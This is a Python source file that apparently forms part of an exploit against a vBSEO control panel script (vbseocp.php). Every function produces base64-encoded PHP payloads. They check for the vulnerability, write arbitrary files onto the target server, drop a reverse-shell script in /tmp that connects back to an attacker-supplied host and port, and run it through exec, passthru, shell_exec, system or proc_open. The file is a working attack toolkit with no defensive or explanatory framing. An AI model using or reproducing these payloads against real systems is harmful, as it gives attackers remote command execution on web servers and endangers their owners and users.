#!/usr/bin/env python
import base64
from python import generate_reverse_shell

def check_vuln():
	php = """echo "Target is vulnerable"; exit;"""
	return base64.b64encode(php).replace('=', '')

def upload(lfile, fname):
	openfile = base64.b64encode(open(lfile).read()).replace('=', '')
	php = """
if(file_put_contents('"""+fname+"""', base64_decode('"""+openfile+"""'))) {
	$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$url = str_replace('vbseocp.php', '"""+fname+"""', $url);
	echo "File was successfully saved to: $url";
} else {
	echo "File was not saved!";
}
exit;
"""
	return base64.b64encode(php).replace('=', '')

def spawn_shell(lhost, lport):
	php = """
function spawn_reverse_shell() {
	$ar = array();
	if(function_exists("exec")) {
		array_push($ar, "exec");
	}
	if(function_exists("passthru")) {
		array_push($ar, "passthru");
	}
	if(function_exists("shell_exec")) {
		array_push($ar, "shell_exec");
	}
	if(function_exists("system")) {
		array_push($ar, "system");
	}
	if(function_exists("proc_open")) {
		array_push($ar, "proc_open");
	}
	if(empty($ar)) {
		echo "1";
	} else {
		if(is_dir("/tmp")) {
			if(file_put_contents("/tmp/bc.py", base64_decode('"""+generate_reverse_shell(lhost, lport)+"""'))) {
				echo "2";
			} else {
				echo "3";
			}
		} else {
			if(file_put_contents("bc.py", base64_decode('"""+generate_reverse_shell(lhost, lport)+"""'))) {
				echo "4";
			} else {
				echo "5";
			}
		}
	}
}
spawn_reverse_shell();
exit;
"""
	return base64.b64encode(php).replace('=', '')

def execute_reverse_shell(mode):
	php = """
function execute_reverse_shell($dir) {
	if($dir == 1) {
		$dir = "/tmp";
	} else {
		$dir = getcwd();
	}
	if(function_exists("exec")) {
		exec("python $dir/bc.py");
	} elseif(function_exists("passthru")) {
		passthru("python $dir/bc.py");
	} elseif(function_exists("shell_exec")) {
		shell_exec("python $dir/bc.py");
	} elseif(function_exists("system")) {
		system("python $dir/bc.py");
	} elseif(function_exists("proc_open")) {
		proc_close(proc_open("python $dir/bc.py", array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io));
	}
}
execute_reverse_shell("""+str(mode)+""");
exit;
"""
	return base64.b64encode(php).replace('=', '')
	
